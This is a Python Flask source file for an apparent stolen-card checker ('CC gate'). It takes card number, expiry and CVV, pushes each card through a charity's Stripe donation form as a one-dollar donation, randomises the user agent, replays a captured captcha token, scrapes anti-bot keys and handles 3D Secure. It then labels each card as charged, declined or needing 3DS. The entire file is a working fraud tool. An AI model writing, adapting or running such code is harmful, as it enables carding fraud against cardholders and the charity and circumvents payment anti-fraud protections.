from flask import Flask, jsonify
import requests
import json
import re
import base64
import logging
from fake_useragent import UserAgent

app = Flask(__name__)

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Initialize user agent
ua = UserAgent()

@app.route('/gateway=ccn/cc=<card_details>', methods=['GET'])
def stripe_ccn_payment(card_details):
    try:
        # Parse card details
        card_data = card_details.split('|')
        if len(card_data) != 4:
            return jsonify({"error": "Invalid card format. Use number|exp_month|exp_year|cvv"}), 400

        card_number, exp_month, exp_year, cvv = card_data

        # Validate input
        if not all([card_number, exp_month, exp_year, cvv]):
            return jsonify({"error": "Missing required card details"}), 400

        # Normalize expiry year
        if len(exp_year) == 2:
            if exp_year[0] in ['2', '1']:
                exp_year = f"202{exp_year[1]}"
            else:
                exp_year = f"20{exp_year}"

        user_agent = ua.random

        # Step 1: Fetch Stripe IDs (muid, sid, guid)
        url = "https://m.stripe.com/6"
        payload = "JTdCJTIydjIlMjIlM0ExJTJDJTIyaWQlMjIlM0ElMjJhOTc5M2QyNmY0MGExMDQ3YmUzNjZkYmIyMDQyYWQwMiUyMiUyQyUyMnQlMjIlM0ExMTQlMkMlMjJ0YWclMjIlM0ElMjI0LjUuNDMlMjIlMkMlMjJzcmMlMjIlM0ElMjJqcyUyMiUyQyUyMmElMjIlM0ElN0IlMjJhJTIyJTNBJTdCJTIydiUyMiUzQSUyMnRydWUlMjIlMkMlMjJ0JTIyJTNBNiU3RCUyQyUyMmIlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyZmFsc2UlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmMlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyYXItRUclMjIlMkMlMjJ0JTIyJTNBMSU3RCUyQyUyMmQlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyTGludXglMjBhcm12ODElMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmUlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyTGthVktrYSUyQ1RvVUtrU3czYk50V3E4OSUyQyUyQ0RKTSUyQyUyMHQxRGdRSU10JTJDcFVLa1NvY3Q5ZTJiVlNKaiUyQyUyQ3RXcSUyMiUyQyUyMnQlMjIlM0EyJTdEJTJDJTIyZiUyMiUzQSU3QiUyJnYlMjIlM0ElMjIzODF3Xzg0NWhfMjRkXzEuODkzNzUwMDcxNTI1NTczN3IlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmclMjIlM0ElN0IlMjJ2JTIyJTNBJTIyMyUyMiUyQyUyMnQlMjIlM0EwJTdEJTJDJTIyaCUyMiUzQSU3QiUyJnYlMjIlM0ElMjJ0cnVlJTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJpJTIyJTNBJTdCJTIydiUyMiUzQSUyMnNlc3Npb25TdG9yYWdlLWVuYWJsZWQlMkMlMjBsb2NhbFN0b3JhZ2UtZW5hYmxlZCUyMiUyQyUyMnQlMjIlM0E0JTdEJTJDJTIyaiUyMiUzQSU3QiUyJnYlMjIlM0ElMjIwMDAwMDAwMTAwMDAwMDAwMDAwMTEwMTAxMDAwMDAwMDAwMDAwMDAwMDAxMDAwMDEwMTEwMTEwJTIyJTJDJTIydCUyMiUzQTYyJTJDJTIyYXQlMjIlM0EzJTdEJTJDJTIyayUyMiUzQSU3QiUyJnYlMjIlM0ElMjIlMjIlMkMlMjJ0JTIyJTNBMCU3RCUyQyUyMmwlMjIlM0ElN0IlMjJ2JTIyJTNBJTIyTW96aWxsYSUyRjUuMCUyMChMaW51eCUzQiUyMEFuZHJvaWQlMjAxMCUzQiUyMEspJTIwQXBwbGVXZWJLaXQlMkY1MzcuMzYlMjAoS0hUTUwlMkMlMjBsaWtlJTIwR2Vja28pJTIwQ2hyb21lJTJGMTI0LjAuMC4wJTIwTW9iaWxlJTIwU2FmYXJpJTJGNTM3LjM2JTIyJTJDJTIydCUyMiUzQTAlN0QlMkMlMjJtJTIyJTNBJTdCJTIydiUyMiUzQSUyMiUyMiUyQyUyJnQlMjIlM0EwJTdEJTJDJTIybiUyMiUzQSU3QiUyJnYlMjIlM0ElMjJmYWxzZSUyMiUyQyUyJnQlMjIlM0E5MCU3RCUyQyUyMm8lMjIlM0ElN0IlMjJ2JTIyJTNBJTIyYWVjMzVmMDY1NmM4NDlmZTg4NWM0ZTJjZjYwZDBhNDUlMjIlMkMlMjJ0JTIyJTNBNTAlN0QlN0QlMkMlMjJiJTIyJTNBJTdCJTIyYSUyMiUzQSUyMiUyMiUyQyUyMmIlMjIlM0ElMjJodHRwcyUzQSUyRiUyRlhfdldOcFlRdzJ5aW1QemEybGRpbHNzWjFWZ2xBaDZWM2h4a1RUY2ttMTQuRkJZdkVvQmhDby1hN3hiZ3BrY0paeGFuczE5ZXh0Y3BxQXZvU3FaZnM1WS5fTTBHeXdoNE5nSEpUVTFBalBsZzA0UUdlUW5RdG92ZHE0blM2QlRvZ1FzJTJGV1ctZXhxR2xFSjlCMWU0cmdCcDltenRvWDRXVjg4dTkwdUQ3NnJkbjNtYyUyRl80R09iRjhEbnBKYkZBUVktNThaaHdtQmpBTTlVd1l2U0gtWUNmc203QmclMjIlMkMlMjJjJTIyJTNBJTIyWUNwYUJvTDJEUkFJV1AwaFRpdElwclA3RnNuWVJYMEJaNlc1NW9ILWg0MCUyMiUyQyUyMmQlMjIlM0ElMjJOQSUyMiUyQyUyMmUlMjIlM0ElMjJOQSUyMiUyQyUyMmYlMjIlM0FmYWxzZSUyQyUyMmclMJIlM0F0cnVlJTJDJTIyaCUyMiUzQXRydWUlMkMlMjJpJTIyJTNBJTVCJTIybG9jYXRpb24lMjIlNUQlMkMlMjJqJTIyJTNBJTVCJTVEJTJDJTIybiUyMiUzQTczMyUyQyUyMnUlMjIlM0ElMjJ3d3cubGlvbnNjbHVicy5vcmclMjIlMkMlMjJ3JTIyJTNBJTIyMTcxNTEwNTA0MzQ1MyUzQWQyMzM4N2EyMTRiZGY2NDc3NGVhNzEwMDk0ODcwNDVmZWUwYTZhZDFmNGRlODkwZTRmMGRkOWM2Njg4NmVjZWUlMjIlN0QlMkMlMjJoJTIyJTNBJTIyYWQ2OTVhYzI0N2VmODVlZWYyNTAlMjIlN0Q="
        headers = {
            'User-Agent': user_agent,
            'Content-Type': "text/plain",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-mobile': '?1',
            'sec-gpc': '1',
            'accept-language': 'ar-EG,ar;q=0.9',
            'origin': 'https://m.stripe.network',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://m.stripe.network/',
            'priority': 'u=1, i'
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to fetch Stripe IDs: status {response.status_code}, response {response.text[:200]}")
            return jsonify({"error": "Failed to fetch Stripe IDs"}), 500

        try:
            muid = response.json()["muid"]
            sid = response.json()["sid"]
            guid = response.json()["guid"]
        except KeyError:
            logger.error(f"Failed to parse Stripe IDs: {response.json()}")
            return jsonify({"error": "Failed to parse Stripe IDs", "details": response.json()}), 500

        # Step 2: Fetch donation page
        url = "https://www.lionsclubs.org/en/donate"
        headers = {
            'User-Agent': user_agent,
            'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'upgrade-insecure-requests': "1",
            'sec-gpc': "1",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "navigate",
            'sec-fetch-user': "?1",
            'sec-fetch-dest': "document",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'accept-language': "ar-EG,ar;q=0.9",
            'referer': "https://www.lionsclubs.org/en/donate",
            'priority': "u=0, i",
            'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
        }

        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to fetch donation page: status {response.status_code}")
            return jsonify({"error": "Failed to fetch donation page"}), 500

        try:
            getkey = response.text.split('name="stripe_card[client_secret]" value=')[1].split('"')[1]
            key = getkey.split('_secret_')
            bot_key = response.text.split('"webform-submission-donation-paragraph-34856-add-form","key":')[1].split('"')[1]
            href = response.text.split('<a href="/en/node')[1].split('/')[1].split('"')[0]
            form_data = response.text.split('data-drupal-selector=')[1].split('"')[1]
        except IndexError:
            logger.error("Failed to parse donation page")
            return jsonify({"error": "Failed to parse donation page, gate may be dead"}), 500

        # Extract session cookie
        cookie = str(response.cookies).split(' for ')[0].split('<Cookie ')[1]

        # Step 3: Submit donation form
        url = "https://www.lionsclubs.org/en/donate"
        params = {
            'ajax_form': "1",
            '_wrapper_format': "drupal_ajax"
        }
        payload = f"campaign=1&is_this_a_recurring_gift_=One-Time-Gift&how_much_would_you_like_to_donate_=other_amount&donate_amount=1.00&who_is_this_gift_from_=business&business_name=networks&club_or_district_name=&club_or_district_id=&first_name=&last_name=&email_address_2=aqga347@gmail.com&phone_number_optional=&address[address]=new+york+cite&address[address_2]=nrw+york&address[postal_code]=10080&address[city]=NY&address[country]=United+States&address[state_province]=New+York&address_provinces_canada=&address_states_india=&sponsoring_lions_club_name=&sponsoring_lions_club_id=&club_name=&club_id=&member_id_optional_=&is_this_an_anonymous_gift_=no&recognition_request=no+recognition&recognition_name=&recognition_plaque_display=&recognition_club_name=&recognition_member_id=&recognition_message=&special_instructions=&recognition_shipping_first_name=&recognition_shipping_last_name=&recognition_shipping_phone=&recognition_shipping_address[address]=&recognition_shipping_address[address_2]=&recognition_shipping_address[postal_code]=&recognition_shipping_address[city]=&recognition_shipping_address[country]=&recognition_shipping_address[state_province]=&shipping_address_provinces_in_canada=&shipping_address_states_india=&recognition_shipping_comments=&how_would_you_like_to_pay_=credit-card&name_on_card=join.jl+jond+alj&stripe_card[payment_intent]={key[0]}&stripe_card[client_secret]={getkey}&stripe_card[trigger]=1715105190944&leave_this_field_blank=&url_redirection=&form_build_id={form_data}&form_id=webform_submission_donation_paragraph_34856_add_form&antibot_key={bot_key}&_triggering_element_name=stripe-stripe_card-button&_triggering_element_value=Update&_drupal_ajax=1&ajax_page_state[theme]=lionsclubs&ajax_page_state[theme_token]=&ajax_page_state[libraries]=antibot/antibot.form,better_exposed_filters/auto_submit,better_exposed_filters/datepickers,better_exposed_filters/general,ckeditor_accordion/accordion.frontend,core/drupal.autocomplete,core/drupal.states,core/internal.jquery.form,custom_club_locator/custom_club_locator,lions_solr_search/solr_search,lions_virtual_convention/lci-stripe-js,lionsclubs/global,paragraphs/drupal.paragraphs.unpublished,search_api_autocomplete/search_api_autocomplete,stripe/stripe,system/base,tb_megamenu/theme.tb_megamenu,webform/webform.composite,webform/webform.element.details.save,webform/webform.element.details.toggle,webform/webform.element.message,webform/webform.element.options,webform/webform.element.select,webform/webform.form"

        headers = {
            'User-Agent': user_agent,
            'Accept': "application/json, text/javascript, */*; q=0.01",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/x-www-form-urlencoded",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'x-requested-with': "XMLHttpRequest",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'sec-gpc': "1",
            'accept-language': "ar-EG,ar;q=0.9",
            'origin': "https://www.lionsclubs.org",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.lionsclubs.org/en/donate",
            'priority': "u=1, i",
            'Cookie': f"nav=public; __stripe_mid={muid}; __stripe_sid={sid}"
        }

        response = requests.post(url, params=params, data=payload, headers=headers, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to submit donation form: status {response.status_code}")
            return jsonify({"error": "Failed to submit donation form"}), 500

        # Step 4: Create payment method
        url = "https://api.stripe.com/v1/payment_methods"
        payload = f"type=card&card%5Bnumber%5D={card_number}&card%5Bexp_month%5D={exp_month}&card%5Bexp_year%5D={exp_year}&card%5Bcvc%5D={cvv}&guid={guid}&muid={muid}&sid={sid}&payment_user_agent=stripe.js%2F3c0be72fe0%3B+stripe-js-v3%2F3c0be72fe0%3B+card-element&referrer=https%3A%2F%2Fwww.lionsclubs.org&time_on_page=141466&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&radar_options%5Bhcaptcha_token%5D=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQX9g_37ymfPsiURS9xeDlKT9eSZht5LUcO5RW1il3vX-I5Jp_T5bqsQnrys4t54vhKFBvoRPfEbufcmmV461d6fHEc3XVfq00qcyUAKAtdPk1T87jVT8nM35n_hoeRHIJiOjzgGnKJ8l03SVQIWPuP7HZZ14LA93EpVq_Wv9Vr_O1pmloG5avnDGbhk5DRpItqUkqSpDwH67S1DLnrKK_SbqaxufhvCD3f8zuTfjV30c-1GHm-wOH_6HkfpF2JHJUPIIZyVYTcPToHc17u1DVuprlHc08Z4p23LDTRPBrG3b7_U-eYznKlDlj6Bp7fhKwMfhC9FqyDSNXDnTDt7c8DmZv4qYI06ewVL-xXKH0VytaMvMkcmz_qvGdLTweGXP0gckLd07UxDPrG_1COrTKI2T_KqNmhYPTisXEo86N73a2dPvK1kleLAswjKbcgFN24ZuHoyzO4XcfSjeUjWbnAORz__jMsUD9vt5BpmVL_vPpGDieE0DoTRrJ9tcoIJIybWUhjY9MkDeidaH1uuYmDFcN5hKMHQKzXc_IXzrYXnPlOO-6LYoS6tS6Vz2IzVUnQUMB9phGetJMF52fanQOswf5L0U16vgxhB1qcRH4oOkHa6ibiC--qpK7aABO3XQ2wUli4NCyJ7pa4BSkkgnLoxR13_90m-0VJ56tsPIrFmyieysedF6t-ETqWFEBHCwUvoHSBlo6ujH7bah-X6TVvqraRqNSRdZxgmLS9nvIbnY3ur_JiDDTdKb9B0kMeLxdZDRHyv0_VoBBE5Q-MGgK_QkCko3Rvs43--VKLZO7jxnqCP_hH-ndQw3dWx1UxMIRFxbMzCXxb-SPBHV3IXz3v4RFYwEokrp8kbbyiN6mCIp6q-CUNGi2uj2CkYkKpuv5obgKHSYOjYzNLRBM1h2fW9Fj5z9XdfnOo017ORWH0BaFIK1HMoHl3nNZuB9ykPO4yowl2HSBb1S_UlJM55XIGUmE1ppBui9Q1xLjHfDh1en95aJIunKk95Klzf0srnPLYh_sbo1LSMLZ41Js_eVH_IOynN803XYu5qlQMGG99GlzW8kbtO4UawuaJ8FzTSEm9tAnFepv_ZCm-MYpxsQ5PvZwVwcyEm1rqJndeUSSlHsEB9lz_v20HTpCpJplxTSw_NN1tkv6raf5CY4wnsqjTMRIxxImpUH4GZSR-keE2qqY0VqcYlSUYB0pfsplYRiKWCkQN9Y4Q4LQG1ErP57o7fh-y2PfrhW1hAHNL6DNoLyDILMNIRIh-lqvtc_HLlwhpyOaSPZi4jLyvbReNbLIOtcHDpamhdraNbs0818SAM4g50E-UXgSmWXt3pVpao4f72O1WL2V-AW04o2vaMEm9UhRQHYTAXNEjIxndP_eW23W70p6YVqbvwGroEJzFiW7jXFiFyigO1BGs4txQGsLHEm0HcKGEF58078NS64d5fz0Wu1H1dGGYDo8HZtBTJomvjuItuod1AzqDn24v8KRiFLLbXwb37Okq5GfEs3qDmk8eOj7Ri_Po89fsu1y0aEXdwXuxaaAeC75xGOkx0KP_mrHdsLYDr6M6-4S6SQXXxqjT-mbVPZ7PmGUdI_kFlCr8IB4LJpIRao0hfz4dkJH13ztWkhMUWTh6QJ5LYlbbmnRFFSKY6XRC6PcyEaE8eV1rGWlh0x4xmmRQozl0e8u0Fsw40h75Gjjxo1vcLzC1P-oSbZ1YejGmI5FUsUBgZ24siEFEDwjypfQAeZxD3HL6x_YPPf1KbmrEWop06mLnzL9-4xDbeew0ch9tbCZQ5D7EiAoUyiy6iHW1sqJoSyvafgYEARhbofpoKeeltgZ17kt2UxlHlVsQpC2qbzgDInY-gXv6ZbgPmlW1oOckIjX5E-wGHHo9fEopU68ARx5n2-OKfq1o6p-g_quW4_tl1r94UWY3-vFvp67VtSnlbmDza4qzhR7hVvQInydak10UHI065hR7rHd7SwVi1Sr1fgn8_hlJRD9a3EzCRi7hh_maJ0w12RV2OlIFj_hywqa1xwqoCCaevmPri2a_3F1Dyo2V4cM5mOm39qHNoYXJkX2lkzgMxg2-ia3KoM2I0M2I2NGOicGQA.FlnlVe8UQdMFpN0ov4GUD3fHEbVbuh0w0zuMrWtFPLs"
        headers = {
            'User-Agent': user_agent,
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/x-www-form-urlencoded",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'sec-gpc': "1",
            'accept-language': "ar-EG,ar;q=0.9",
            'origin': "https://js.stripe.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://js.stripe.com/",
            'priority': "u=1, i"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code != 200 or 'pm_' not in response.text:
            logger.error(f"Failed to create payment method: status {response.status_code}, response {response.text[:200]}")
            return jsonify({"error": "Failed to create payment method", "details": response.text[:200]}), 500

        pm = response.json()['id']

        # Step 5: Attach payment method
        url = "https://www.lionsclubs.org/lions_payment/method_id"
        payload = json.dumps({
            "paymentMethodId": pm,
            "paymentintent": key[0],
            "currentPath": f"/en/node/{href}"
        })
        headers = {
            'User-Agent': user_agent,
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/json",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'sec-gpc': "1",
            'accept-language': "ar-EG,ar;q=0.9",
            'origin': "https://www.lionsclubs.org",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.lionsclubs.org/en/donate",
            'priority': "u=1, i",
            'Cookie': f"__stripe_mid={muid}; __stripe_sid={sid}; {cookie}"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to attach payment method: status {response.status_code}")
            return jsonify({"error": "Failed to attach payment method"}), 500

        # Step 6: Confirm payment intent
        url = f"https://api.stripe.com/v1/payment_intents/{key[0]}/confirm"
        payload = f"payment_method={pm}&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5&client_secret={getkey}"
        headers = {
            'User-Agent': user_agent,
            'Accept': "application/json",
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'Content-Type': "application/x-www-form-urlencoded",
            'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': '"Android"',
            'sec-gpc': "1",
            'accept-language': "ar-EG,ar;q=0.9",
            'origin': "https://js.stripe.com",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://js.stripe.com/",
            'priority': "u=1, i"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=10)
        if response.status_code != 200:
            logger.error(f"Failed to confirm payment intent: status {response.status_code}, response {response.text[:200]}")
            return jsonify({"error": "Failed to confirm payment intent", "details": response.text[:200]}), 500

        status = response.json().get("status")
        if status == 'requires_source_action':
            # Step 7: Handle 3D Secure
            try:
                tr = response.json()['next_action']['use_stripe_sdk']['server_transaction_id']
                pyc = response.json()['next_action']['use_stripe_sdk']['three_d_secure_2_source']
            except KeyError:
                logger.error(f"Failed to extract 3DS data: {response.json()}")
                return jsonify({"error": "Failed to extract 3DS data", "details": response.json()}), 500

            cod = f'{{"threeDSServerTransID":"{tr}"}}'
            url = "https://www.base64encode.org"
            payload = f'input={cod}&charset=UTF-8&separator=lf'
            headers = {
                'User-Agent': user_agent,
                'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Content-Type': "application/x-www-form-urlencoded",
                'cache-control': "max-age=0",
                'sec-ch-ua': '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': '"Android"',
                'upgrade-insecure-requests': "1",
                'origin': "https://www.base64encode.org",
                'sec-fetch-site': "same-origin",
                'sec-fetch-mode': "navigate",
                'sec-fetch-user': "?1",
                'sec-fetch-dest': "document",
                'referer': "https://www.base64encode.org/",
                'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
                'priority': "u=0, i",
            }

            response = requests.post(url, data=payload, headers=headers, timeout=10)
            if response.status_code != 200:
                logger.error(f"Failed to encode 3DS data: status {response.status_code}")
                return jsonify({"error": "Failed to encode 3DS data"}), 500

            try:
                data = response.text.split('spellcheck="false">')[2].split('<')[0]
            except IndexError:
                logger.error("Failed to parse base64 encoded data")
                return jsonify({"error": "Failed to parse base64 encoded data"}), 500

            url = "https://api.stripe.com/v1/3ds2/authenticate"
            payload = f'source={pyc}&browser=%7B%22fingerprintAttempted%22%3Atrue%2C%22fingerprintData%22%3A%22{data}%22%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22ar-EG%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22845%22%2C%22browserScreenWidth%22%3A%22381%22%2C%22browserTZ%22%3A%22-180%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_gaSDC8QsAaou2vzZP59yJ8S5'

            headers = {
                'User-Agent': user_agent,
                'Accept': "application/json",
                'Accept-Encoding': "gzip, deflate, br, zstd",
                'Content-Type': "application/x-www-form-urlencoded",
                'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
                'sec-ch-ua-mobile': "?1",
                'sec-ch-ua-platform': '"Android"',
                'sec-gpc': "1",
                'accept-language': "ar-EG,ar;q=0.9",
                'origin': "https://js.stripe.com",
                'sec-fetch-site': "same-site",
                'sec-fetch-mode': "cors",
                'sec-fetch-dest': "empty",
                'referer': "https://js.stripe.com/",
                'priority': "u=1, i"
            }

            response = requests.post(url, data=payload, headers=headers, timeout=10)
            if response.status_code != 200:
                logger.error(f"Failed to authenticate 3DS: status {response.status_code}, response {response.text[:200]}")
                return jsonify({"error": "Failed to authenticate 3DS", "details": response.text[:200]}), 500

            state = response.json().get('state')
            if state == 'failed':
                url = f"https://api.stripe.com/v1/payment_intents/{key[0]}"
                params = {
                    'key': "pk_live_gaSDC8QsAaou2vzZP59yJ8S5",
                    'is_stripe_sdk': "false",
                    'client_secret': getkey
                }
                headers = {
                    'User-Agent': user_agent,
                    'Accept': "application/json",
                    'Accept-Encoding': "gzip, deflate, br, zstd",
                    'sec-ch-ua': '"Chromium";v="124", "Brave";v="124", "Not-A.Brand";v="99"',
                    'sec-ch-ua-mobile': "?1",
                    'sec-ch-ua-platform': '"Android"',
                    'sec-gpc': "1",
                    'accept-language': "ar-EG,ar;q=0.9",
                    'origin': "https://js.stripe.com",
                    'sec-fetch-site': "same-site",
                    'sec-fetch-mode': "cors",
                    'sec-fetch-dest': "empty",
                    'referer': "https://js.stripe.com/",
                    'priority': "u=1, i"
                }

                response = requests.get(url, params=params, headers=headers, timeout=10)
                if response.status_code != 200:
                    logger.error(f"Failed to check payment intent: status {response.status_code}")
                    return jsonify({"error": "Failed to check payment intent"}), 500

                response_text = response.text
                if 'The provided PaymentMethod has failed authentication' in response_text:
                    return jsonify({"status": f"{card_details}|You Card Declined"})
                elif any(x in response_text for x in [
                    "Error updating default payment method.Your card does not support this type of purchase.",
                    "Your card does not support this type of purchase.",
                    "transaction_not_allowed",
                    "insufficient_funds",
                    "incorrect_zip",
                    "Your card has insufficient funds.",
                    "security code is incorrect.",
                    "security code is invalid."
                ]):
                    return jsonify({"status": f"{card_details}|Ccn Charge ✅"})
                elif 'success' in response_text:
                    return jsonify({"status": f"{card_details}|Ccn Charge ✅"})
                else:
                    return jsonify({"status": f"{card_details}|Unknown response", "details": response_text[:200]})
            else:
                return jsonify({"status": f"{card_details}|3d socure"})
        else:
            error_message = response.json().get('error', {}).get('message', 'Unknown error')
            return jsonify({"status": f"{card_details}|{error_message}"})

    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
